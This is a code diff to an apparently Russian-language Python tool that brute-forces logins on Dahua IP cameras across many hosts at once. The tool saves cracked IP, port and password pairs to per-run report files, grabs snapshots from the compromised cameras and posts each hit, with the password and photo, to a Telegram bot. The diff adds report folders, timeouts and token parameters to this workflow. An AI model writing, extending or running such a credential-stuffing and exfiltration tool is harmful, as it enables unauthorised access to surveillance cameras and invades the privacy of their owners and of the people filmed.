@@ -21,10 +21,12 @@ from .dahua import DahuaController
 
 LOGGING_FOLDER = Path("dahua_logs")
 SNAPSHOTS_FOLDER = Path("snapshots")
+REPORTS_DIR = Path("reports")
 FOUND_DEVICES_FILE = Path("found_devices.txt")
 
 LOGGING_FOLDER.mkdir(parents=True, exist_ok=True)
 SNAPSHOTS_FOLDER.mkdir(parents=True, exist_ok=True)
+REPORTS_DIR.mkdir(parents=True, exist_ok=True)
 
 log_filename = LOGGING_FOLDER / f'log_{datetime.now().strftime("%Y%m%d-%H%M%S")}.log'
 logging.basicConfig(
@@ -40,6 +42,10 @@ alive_count = 0
 blocked_count = 0
 bruted_devices: list[tuple[str, int, str, str]] = []
 
+last_report_dir: Path | None = None
+last_xml_files: list[str] = []
+_current_run_report_dir: Path | None = None
+
 _emergency_lock = threading.Lock()
 _emergency_done = False
 _active_executor: concurrent.futures.ThreadPoolExecutor | None = None
@@ -47,13 +53,15 @@ _active_executor: concurrent.futures.ThreadPoolExecutor | None = None
 
 def _append_found_device(device: tuple, filepath: Path | str = FOUND_DEVICES_FILE) -> None:
     try:
+        path = Path(filepath)
+        path.parent.mkdir(parents=True, exist_ok=True)
         ip = device[0]
         port = device[1]
         login = device[2]
         password = device[3]
         model = device[4] if len(device) > 4 and device[4] else ""
         line = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
-        with open(filepath, "a", encoding="utf-8") as f:
+        with open(path, "a", encoding="utf-8") as f:
             f.write(line + "\n")
             f.flush()
             try:
@@ -61,21 +69,26 @@ def _append_found_device(device: tuple, filepath: Path | str = FOUND_DEVICES_FIL
             except Exception:
                 pass
     except Exception as e:
-        logging.error(f"failed to append found device {device}: {e}")
+        logging.error(f"failed to append found device {device} to {filepath}: {e}")
 
 
 def emergency_save(
     devices: list[tuple] | None = None,
     make_xml: bool = True,
-    max_xml_entries: int = 64
+    max_xml_entries: int = 64,
+    folder: Path | None = None
 ) -> tuple[int, list[str]]:
-    global bruted_devices
+    global bruted_devices, _current_run_report_dir, last_xml_files
     with stats_lock:
         to_save = list(devices if devices is not None else bruted_devices)
 
     if not to_save:
         return 0, []
 
+    save_folder = folder or _current_run_report_dir or (REPORTS_DIR / datetime.now().strftime("result-%Y%m%d-%H%M%S"))
+    save_folder.mkdir(parents=True, exist_ok=True)
+
+    # 1. Запись в общий found_devices.txt с дедупликацией
     existing_lines = set()
     if FOUND_DEVICES_FILE.exists():
         try:
@@ -98,18 +111,30 @@ def emergency_save(
                     f.write(entry + "\n")
                     existing_lines.add(entry)
             f.flush()
-            try:
-                os.fsync(f.fileno())
-            except Exception:
-                pass
     except Exception as e:
         logging.error(f"failed emergency txt save: {e}")
+
+    # 2. Запись в found_devices.txt текущей сессии
+    try:
+        run_txt = save_folder / "found_devices.txt"
+        with open(run_txt, "w", encoding="utf-8") as f:
+            for dev in to_save:
+                ip = dev[0]
+                port = dev[1]
+                login = dev[2]
+                password = dev[3]
+                model = dev[4] if len(dev) > 4 and dev[4] else ""
+                entry = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
+                f.write(entry + "\n")
+    except Exception as e:
+        logging.error(f"failed run report txt save: {e}")
 
     saved_xmls: list[str] = []
     if make_xml:
         try:
             from . import save_to_xml
-            saved_xmls = save_to_xml.save_xml(to_save, max_xml_entries=max_xml_entries)
+            saved_xmls = save_to_xml.save_xml(to_save, max_xml_entries=max_xml_entries, folder=save_folder)
+            last_xml_files = saved_xmls
         except Exception as e:
             logging.error(f"failed emergency xml save: {e}")
 
@@ -175,12 +200,14 @@ def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, 
     if not token or not chat_id:
         return False
 
-    url = f"https://{config.tg_endpoint}/bot{token}"
+    endpoint = config.clean_tg_endpoint
+    url = f"https://{endpoint}/bot{token}"
+    dahuamodel = f"🎥 модель: <code>{model}</code>\n" if model else "🎥 модель: неизвестная камера\n"
     caption = (
         "📷 <b>нашел новую камеру</b>\n\n"
         f"🌐 айпи: <code>{device[0]}</code>\n"
         f"🌐 порт: <code>{device[1]}</code>\n"
-        f"🎥 модель: <code>{model}</code>\n" if model else "неизвестная камера"
+        f"{dahuamodel}"
         f"👤 логин: <code>{login}</code>\n"
         f"🔑 пароль: <code>{password}</code>"
     )
@@ -190,21 +217,21 @@ def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, 
             with open(ss_path, "rb") as ph:
                 files = {"photo": ("snapshot.jpg", ph, "image/jpeg")}
                 data = {
-                    "chat_id": chat_id,
+                    "chat_id": str(chat_id),
                     "caption": caption,
                     "parse_mode": "HTML"
                 }
                 resp = requests.post(f"{url}/sendPhoto", data=data, files=files, timeout=15)
         else:
             data = {
-                "chat_id": chat_id,
+                "chat_id": str(chat_id),
                 "text": caption,
                 "parse_mode": "HTML"
             }
             resp = requests.post(f"{url}/sendMessage", data=data, timeout=15)
 
         if resp.status_code == 200:
-            logging.debug(f"user was successfully notified about {device[0]}:{device[1]}")
+            logging.info(f"telegram: user notified about {device[0]}:{device[1]}")
             return True
         else:
             logging.error(f"telegram API notification error ({resp.status_code}): {resp.text}")
@@ -214,11 +241,11 @@ def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, 
         return False
 
 
-def get_snapshot(ip: str, port: int, login: str, passw: str) -> str | None:
+def get_snapshot(ip: str, port: int, login: str, passw: str, timeout: float = 10.0) -> str | None:
     global snapshots_count
     try:
         logging.info(f"connecting to {ip}:{port} for snapshot...")
-        with DahuaController(ip, port, login, passw) as cam:
+        with DahuaController(ip, port, login, passw, timeout=timeout) as cam:
             if cam.status != 0:
                 return None
 
@@ -251,12 +278,12 @@ def get_snapshot(ip: str, port: int, login: str, passw: str) -> str | None:
     return None
 
 
-def dhlogin(ip: str, port: int, login: str, passw: str):
+def dhlogin(ip: str, port: int, login: str, passw: str, timeout: float = 10.0):
     global alive_count, blocked_count
 
     logging.info(f"trying to login {ip}:{port} with credentials {login}:{passw}")
     try:
-        with DahuaController(ip, port, login, passw) as cam:
+        with DahuaController(ip, port, login, passw, timeout=timeout) as cam:
             if cam.status == 0:
                 logging.info(f"{ip}:{port} logged in successfully")
                 with stats_lock:
@@ -275,7 +302,15 @@ def dhlogin(ip: str, port: int, login: str, passw: str):
         return None
 
 
-def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token: str | None, chat_id: int | str | None):
+def check_host(
+    host_str: str,
+    cred_list: list,
+    dosnap: bool,
+    notify: bool,
+    token: str | None,
+    chat_id: int | str | None,
+    timeout_sec: float = 10.0
+):
     host_str = host_str.strip()
     match = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$", host_str)
     if not match:
@@ -286,7 +321,7 @@ def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token
     port = int(match.group(2))
 
     for login, password in cred_list:
-        res = dhlogin(ip, port, login, password)
+        res = dhlogin(ip, port, login, password, timeout=timeout_sec)
         if res == "blocked":
             logging.warning(f"{ip}:{port} blocked login attempts, stopping")
             return "blocked"
@@ -300,11 +335,13 @@ def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token
             device = (ip, port, login, password, model)
             with stats_lock:
                 bruted_devices.append(device)
-                _append_found_device(device)
+                _append_found_device(device, FOUND_DEVICES_FILE)
+                if _current_run_report_dir:
+                    _append_found_device(device, _current_run_report_dir / "found_devices.txt")
 
             ss_path = None
             if dosnap:
-                ss_path = get_snapshot(ip, port, login, password)
+                ss_path = get_snapshot(ip, port, login, password, timeout=timeout_sec)
 
             if notify and token and chat_id:
                 post_tg(token, chat_id, (ip, port), ss_path, login, password, model=model)
@@ -331,17 +368,29 @@ def read_targets(file_path: str) -> list[str]:
 
 
 def brute(
+    token: str | None = None,
+    userid: str | int | None = None,
     brute_file_path: str = "input.txt",
     dosnap: bool = True,
     threads: int = 100,
+    timeout: int = 1000,
     notify: bool = True,
     status_callback=None,
     show_progress: bool = True,
     make_import_file: bool = True,
     max_entries: int = 64
 ) -> list[tuple[str, int, str, str]]:
-    global bruted_devices, _active_executor
+    global bruted_devices, _active_executor, _current_run_report_dir, last_report_dir, last_xml_files
     bruted_devices = []
+    last_xml_files = []
+
+    run_timestamp = datetime.now().strftime("result-%Y%m%d-%H%M%S")
+    run_report_dir = REPORTS_DIR / run_timestamp
+    run_report_dir.mkdir(parents=True, exist_ok=True)
+    _current_run_report_dir = run_report_dir
+    last_report_dir = run_report_dir
+
+    timeout_sec = max(0.2, float(timeout) / 1000.0)
 
     try:
         devices = read_targets(brute_file_path)
@@ -381,8 +430,9 @@ def brute(
                 creds,
                 dosnap,
                 notify,
-                config.bot_token,
-                config.userid
+                token,
+                userid,
+                timeout_sec
             )
             workers.append(future)
 
@@ -414,9 +464,9 @@ def brute(
             pbar.close()
             pbar = None
         print("\n\033[1;33mсканирование прервано пользователем\033[0m")
-        count, xml_files = emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
+        count, xml_files = emergency_save(make_xml=make_import_file, max_xml_entries=max_entries, folder=run_report_dir)
         if count > 0:
-            msg = f"\033[1;32mсохранено {count} камер в {FOUND_DEVICES_FILE.name}\033[0m"
+            msg = f"\033[1;32mсохранено {count} камер в {run_report_dir}\033[0m"
             if xml_files:
                 msg += f"\033[1;36m и XML: {', '.join(xml_files)}\033[0m"
             print(msg)
@@ -427,7 +477,7 @@ def brute(
         executor.shutdown(wait=False, cancel_futures=True)
         for w in workers:
             w.cancel()
-        emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
+        emergency_save(make_xml=make_import_file, max_xml_entries=max_entries, folder=run_report_dir)
     finally:
         if pbar is not None:
             pbar.close()
@@ -437,7 +487,7 @@ def brute(
     if bruted_devices and make_import_file:
         try:
             from . import save_to_xml
-            save_to_xml.save_xml(bruted_devices, max_xml_entries=max_entries)
+            last_xml_files = save_to_xml.save_xml(bruted_devices, max_xml_entries=max_entries, folder=run_report_dir)
         except Exception as e:
             logging.error(f"failed to generate final XML: {e}")
 
